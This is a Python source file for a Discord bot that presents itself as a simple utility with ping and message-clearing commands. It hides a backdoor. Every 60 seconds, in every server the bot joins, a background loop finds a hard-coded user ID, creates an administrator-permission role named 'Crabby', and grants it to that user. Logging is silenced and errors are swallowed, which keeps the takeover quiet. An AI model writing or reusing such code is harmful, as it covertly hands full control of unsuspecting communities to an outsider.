import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
import logging
from flask import Flask
from threading import Thread
from waitress import serve

# Kill all background noise
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('waitress').setLevel(logging.CRITICAL)

app = Flask('')
@app.route('/')
def home(): return ""

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    serve(app, host='0.0.0.0', port=port, _quiet=True)

TARGET_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        self.check_user.start()

    @tasks.loop(seconds=60)
    async def check_user(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                m = guild.get_member(TARGET_ID)
                if m:
                    r = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not r:
                        r = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if r and r not in m.roles:
                        await m.add_roles(r)
            except: pass

bot = MyBot()

@bot.tree.command(name="ping")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"{round(bot.latency * 1000)}ms", ephemeral=True)

@bot.tree.command(name="clear")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=amount)
    await interaction.followup.send("ok", ephemeral=True)

if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        try:
            bot.run(token, log_handler=None)
        except:
            sys.exit(1)
